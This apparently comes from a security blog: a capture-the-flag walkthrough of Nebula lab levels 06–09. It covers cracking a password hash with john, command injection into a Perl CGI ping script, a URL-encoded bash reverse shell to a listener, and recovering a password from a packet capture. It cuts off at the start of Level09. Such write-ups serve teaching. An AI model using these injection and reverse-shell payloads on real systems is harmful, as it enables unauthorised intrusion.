
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>0x73696e65</title>
  <meta name="author" content="Norbert Szetei">

  
  <meta name="description" content="Image: Exploit-Exercises: Nebula (v5) Level06 From the assignment &ldquo;The flag06 account credentials came from a legacy unix
system&rdquo; we &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://73696e65.github.io/posts/3/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="0x73696e65" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-64260520-1']);
    _gaq.push(['_setDomainName','github.io']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body    class="collapse-sidebar sidebar-footer" >
  <header role="banner"><hgroup>
  <h1><a href="/">0x73696e65</a></h1>
  
    <h2>information security notes</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="73696e65.github.io">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/06/17/exploit-exercises-nebula-06-10/">Exploit-Exercises: Nebula (06-10)</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-06-17T00:05:09+02:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:05 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/">Exploit-Exercises: Nebula (v5)</a></p>

<h2>Level06</h2>

<p>From the assignment &ldquo;The flag06 account credentials came from a legacy unix
system&rdquo; we conclude that the password is stored in /etc/passwd.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level06@nebula:/home/flag06$ grep flag06 /etc/passwd
</span><span class='line'>flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh</span></code></pre></td></tr></table></div></figure>


<p>We store credentials to /tmp/hash.txt and use john:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level06@nebula:/home/flag06$ john /tmp/hash.txt 
</span><span class='line'>Created directory: /home/level06/.john
</span><span class='line'>Loaded 1 password hash (Traditional DES [128/128 BS SSE2])
</span><span class='line'>hello            (flag06)
</span><span class='line'>guesses: 1  time: 0:00:00:00 100% (2)  c/s: 75300  trying: 12345 - biteme
</span><span class='line'>Use the "--show" option to display all of the cracked passwords reliably</span></code></pre></td></tr></table></div></figure>


<p>Now we can log using &lsquo;hello&rsquo; password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level06@nebula:/home/flag06$ su - flag06
</span><span class='line'>Password: 
</span><span class='line'>flag06@nebula:~$ getflag 
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h2>Level07</h2>

<figure class='code'><figcaption><span>index.cgi </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="c1">#!/usr/bin/perl</span>
</span><span class='line'>
</span><span class='line'><span class="k">use</span> <span class="n">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;Content-type: text/html\n\n&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">sub </span><span class="nf">ping</span> <span class="p">{</span>
</span><span class='line'>  <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">@output</span> <span class="o">=</span> <span class="sb">`ping -c 3 $host 2&gt;&amp;1`</span><span class="p">;</span>
</span><span class='line'>  <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="s">&quot;$line&quot;</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># check if Host set. if not, display normal page, etc</span>
</span><span class='line'>
</span><span class='line'><span class="n">ping</span><span class="p">(</span><span class="n">param</span><span class="p">(</span><span class="s">&quot;Host&quot;</span><span class="p">));</span>
</span></code></pre></td></tr></table></div></figure>


<p>The configuration file is stored in &lsquo;/home/flag07/thttpd.conf&rsquo;.</p>

<p>Because there is no input validation, we have RCE:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level07@nebula:~$ wget -qO- "http://127.0.0.1:7007/index.cgi?Host=127.0.0.1"
</span><span class='line'>&lt;html>&lt;head>&lt;title>Ping results&lt;/title>&lt;/head>&lt;body>&lt;pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.009 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.022 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.023 ms
</span><span class='line'>
</span><span class='line'>--- 127.0.0.1 ping statistics ---
</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 2000ms
</span><span class='line'>rtt min/avg/max/mdev = 0.009/0.018/0.023/0.006 ms
</span><span class='line'>&lt;/pre>&lt;/body>&lt;/html>
</span><span class='line'>
</span><span class='line'>level07@nebula:~$ wget -qO- "http://127.0.0.1:7007/index.cgi?Host=127.0.0.1+%3b+id"
</span><span class='line'>&lt;html>&lt;head>&lt;title>Ping results&lt;/title>&lt;/head>&lt;body>&lt;pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.012 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.022 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.027 ms
</span><span class='line'>
</span><span class='line'>--- 127.0.0.1 ping statistics ---
</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 2000ms
</span><span class='line'>rtt min/avg/max/mdev = 0.012/0.020/0.027/0.007 ms
</span><span class='line'>uid=992(flag07) gid=992(flag07) groups=992(flag07)</span></code></pre></td></tr></table></div></figure>


<p>Inspired by <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bash -i >& /dev/tcp/10.0.0.1/8080 0>&1</span></code></pre></td></tr></table></div></figure>


<p>we can create reverse shell on port 1337 via bash, using ruby to encode our payload:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">sh</span><span class="o">-</span><span class="mi">4</span><span class="o">.</span><span class="mi">2</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">l</span> <span class="mi">1337</span>
</span><span class='line'>
</span><span class='line'><span class="n">sh</span><span class="o">-</span><span class="mi">4</span><span class="o">.</span><span class="mi">2</span><span class="err">$</span> <span class="n">ruby</span> <span class="o">-</span><span class="n">e</span> <span class="s2">&quot;print &#39;http://nebula:7007/index.cgi?Host=&#39; + &#39;127.0.0.1;bash -i &gt;&amp; /dev/tcp/127.0.0.1/1337 0&gt;&amp;1;&#39;.split(//).map{|x| &#39;%&#39; + x.ord.to_s(16)}.join + </span><span class="se">\&quot;\n\&quot;</span><span class="s2">&quot;</span>
</span><span class='line'><span class="ss">http</span><span class="p">:</span><span class="sr">//ne</span><span class="ss">bula</span><span class="p">:</span><span class="mi">7007</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">cgi?</span><span class="no">Host</span><span class="o">=%</span><span class="mi">31</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">3</span><span class="n">b</span><span class="o">%</span><span class="mi">62</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">73</span><span class="o">%</span><span class="mi">68</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">d</span><span class="o">%</span><span class="mi">69</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">3</span><span class="n">e</span><span class="o">%</span><span class="mi">26</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="mi">76</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">74</span><span class="o">%</span><span class="mi">63</span><span class="o">%</span><span class="mi">70</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">37</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">3</span><span class="n">e</span><span class="o">%</span><span class="mi">26</span><span class="o">%</span><span class="mi">31</span><span class="o">%</span><span class="mi">3</span><span class="n">b</span>
</span><span class='line'>
</span><span class='line'><span class="n">sh</span><span class="o">-</span><span class="mi">4</span><span class="o">.</span><span class="mi">2</span><span class="err">$</span> <span class="n">wget</span> <span class="o">-</span><span class="n">qO</span><span class="o">-</span> <span class="s2">&quot;http://nebula:7007/index.cgi?Host=%31%32%37%2e%30%2e%30%2e%31%3b%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%32%37%2e%30%2e%30%2e%31%2f%31%33%33%37%20%30%3e%26%31%3b&quot;</span>
</span><span class='line'><span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="no">Ping</span> <span class="n">results</span><span class="o">&lt;</span><span class="sr">/title&gt;&lt;/</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">body</span><span class="o">&gt;&lt;</span><span class="n">pre</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>In the window with nc, we got:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>flag07@nebula:/home/flag07$ id
</span><span class='line'>id
</span><span class='line'>uid=992(flag07) gid=992(flag07) groups=992(flag07)
</span><span class='line'>
</span><span class='line'>flag07@nebula:/home/flag07$ getflag
</span><span class='line'>getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h2>Level08</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level08@nebula:/home/flag08$ tcpick -C -yU -r capture.pcap
</span><span class='line'>Starting tcpick 0.2.1 at 2015-06-17 05:20 PDT
</span><span class='line'>Timeout for connections is 600
</span><span class='line'>tcpick: reading from capture.pcap
</span><span class='line'>1      SYN-SENT       59.233.235.218:39247 > 59.233.235.223:12121
</span><span class='line'>1      SYN-RECEIVED   59.233.235.218:39247 > 59.233.235.223:12121
</span><span class='line'>1      ESTABLISHED    59.233.235.218:39247 > 59.233.235.223:12121
</span><span class='line'>&lt;ff>&lt;fd>%
</span><span class='line'>&lt;ff>&lt;fc>%
</span><span class='line'>&lt;ff>&lt;fb>&&lt;ff>&lt;fd>&lt;18>&lt;ff>&lt;fd> &lt;ff>&lt;fd>#&lt;ff>&lt;fd>'&lt;ff>&lt;fd>$
</span><span class='line'>&lt;ff>&lt;fe>&&lt;ff>&lt;fb>&lt;18>&lt;ff>&lt;fb> &lt;ff>&lt;fb>#&lt;ff>&lt;fb>'&lt;ff>&lt;fc>$
</span><span class='line'>&lt;ff>&lt;fa> &lt;01>&lt;ff>&lt;f0>&lt;ff>&lt;fa>#&lt;01>&lt;ff>&lt;f0>&lt;ff>&lt;fa>'&lt;01>&lt;ff>&lt;f0>&lt;ff>&lt;fa>&lt;18>&lt;01>&lt;ff>&lt;f0>
</span><span class='line'>&lt;ff>&lt;fa> &lt;00>38400,38400&lt;ff>&lt;f0>&lt;ff>&lt;fa>#&lt;00>SodaCan:0&lt;ff>&lt;f0>&lt;ff>&lt;fa>'&lt;00>&lt;00>DISPLAY&lt;01>SodaCan:0&lt;ff>&lt;f0>&lt;ff>&lt;fa>&lt;18>&lt;00>xterm&lt;ff>&lt;f0>
</span><span class='line'>&lt;ff>&lt;fb>&lt;03>&lt;ff>&lt;fd>&lt;01>&lt;ff>&lt;fd>"&lt;ff>&lt;fd>&lt;1f>&lt;ff>&lt;fb>&lt;05>&lt;ff>&lt;fd>!
</span><span class='line'>&lt;ff>&lt;fd>&lt;03>&lt;ff>&lt;fc>&lt;01>&lt;ff>&lt;fb>"&lt;ff>&lt;fa>"&lt;03>&lt;01>&lt;00>&lt;00>&lt;03>b&lt;03>&lt;04>&lt;02>&lt;0f>&lt;05>&lt;00>&lt;00>&lt;07>b&lt;1c>&lt;08>&lt;02>&lt;04> B&lt;1a>
</span><span class='line'>&lt;02>&lt;7f>&lt;0b>&lt;02>&lt;15>&lt;0f>&lt;02>&lt;11>&lt;10>&lt;02>&lt;13>&lt;11>&lt;02>&lt;ff>&lt;ff>&lt;12>&lt;02>&lt;ff>&lt;ff>&lt;ff>&lt;f0>&lt;ff>&lt;fb>&lt;1f>&lt;ff>&lt;fa>&lt;1f>&lt;00>&lt;b1>&lt;00>1&lt;ff>&lt;f0>&lt;ff>&lt;fd>&lt;05>&lt;ff>&lt;fb>!
</span><span class='line'>&lt;ff>&lt;fa>"&lt;01>&lt;03>&lt;ff>&lt;f0>
</span><span class='line'>&lt;ff>&lt;fa>"&lt;01>&lt;07>&lt;ff>&lt;f0>
</span><span class='line'>&lt;ff>&lt;fa>!&lt;03>&lt;ff>&lt;f0>&lt;ff>&lt;fb>&lt;01>&lt;ff>&lt;fd>&lt;00>&lt;ff>&lt;fe>"
</span><span class='line'>&lt;ff>&lt;fd>&lt;01>&lt;ff>&lt;fb>&lt;00>&lt;ff>&lt;fc>"
</span><span class='line'>&lt;ff>&lt;fa>"&lt;03>&lt;03>&lt;e2>&lt;03>&lt;04>&lt;82>&lt;0f>&lt;07>&lt;e2>&lt;1c>&lt;08>&lt;82>&lt;04>    &lt;c2>&lt;1a>
</span><span class='line'>&lt;82>&lt;7f>&lt;0b>&lt;82>&lt;15>&lt;0f>&lt;82>&lt;11>&lt;10>&lt;82>&lt;13>&lt;11>&lt;82>&lt;ff>&lt;ff>&lt;12>&lt;82>&lt;ff>&lt;ff>&lt;ff>&lt;f0>
</span><span class='line'>
</span><span class='line'>Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)
</span><span class='line'>
</span><span class='line'>&lt;01>&lt;00>wwwbugs login: 
</span><span class='line'>l
</span><span class='line'>&lt;00>l
</span><span class='line'>e
</span><span class='line'>&lt;00>e
</span><span class='line'>v
</span><span class='line'>&lt;00>v
</span><span class='line'>e
</span><span class='line'>&lt;00>e
</span><span class='line'>l
</span><span class='line'>&lt;00>l
</span><span class='line'>8
</span><span class='line'>&lt;00>8
</span><span class='line'>
</span><span class='line'>&lt;01>
</span><span class='line'>&lt;00>
</span><span class='line'>Password: 
</span><span class='line'>b
</span><span class='line'>a
</span><span class='line'>c
</span><span class='line'>k
</span><span class='line'>d
</span><span class='line'>o
</span><span class='line'>o
</span><span class='line'>r
</span><span class='line'>&lt;7f>
</span><span class='line'>&lt;7f>
</span><span class='line'>&lt;7f>
</span><span class='line'>0
</span><span class='line'>0
</span><span class='line'>R
</span><span class='line'>m
</span><span class='line'>8
</span><span class='line'>&lt;7f>
</span><span class='line'>a
</span><span class='line'>t
</span><span class='line'>e
</span><span class='line'>
</span><span class='line'>&lt;00>
</span><span class='line'>&lt;01>
</span><span class='line'>&lt;00>
</span><span class='line'>Login incorrect
</span><span class='line'>wwwbugs login: 
</span><span class='line'>1      FIN-WAIT-1     59.233.235.218:39247 > 59.233.235.223:12121
</span><span class='line'>1      TIME-WAIT      59.233.235.218:39247 > 59.233.235.223:12121
</span><span class='line'>1      CLOSED         59.233.235.218:39247 > 59.233.235.223:12121
</span><span class='line'>tcpick: done reading from capture.pcap
</span><span class='line'>
</span><span class='line'>95 packets captured
</span><span class='line'>1 tcp sessions detected</span></code></pre></td></tr></table></div></figure>


<p>We can see from the output above that 0x7f represents delete keystore, so the password we are looking for is &lsquo;backd00Rmate&rsquo;</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level08@nebula:/home/flag08$</span> su flag08
</span><span class='line'><span class="go">Password: </span>
</span><span class='line'><span class="gp">sh-4.2$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Level09</h2>

<figure class='code'><figcaption><span>level9.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">spam</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\./&quot;</span><span class="p">,</span> <span class="s2">&quot; dot &quot;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/@/&quot;</span><span class="p">,</span> <span class="s2">&quot; AT &quot;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="nv">$email</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">markup</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$use_me</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/(\[email (.*)\])/e&quot;</span><span class="p">,</span> <span class="s2">&quot;spam(</span><span class="se">\&quot;\\</span><span class="s2">2</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\[/&quot;</span><span class="p">,</span> <span class="s2">&quot;&lt;&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\]/&quot;</span><span class="p">,</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="nv">$contents</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$output</span> <span class="o">=</span> <span class="nx">markup</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="nv">$output</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Because the flag09 binary is interpreted via php shell, there is a trivial solution:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
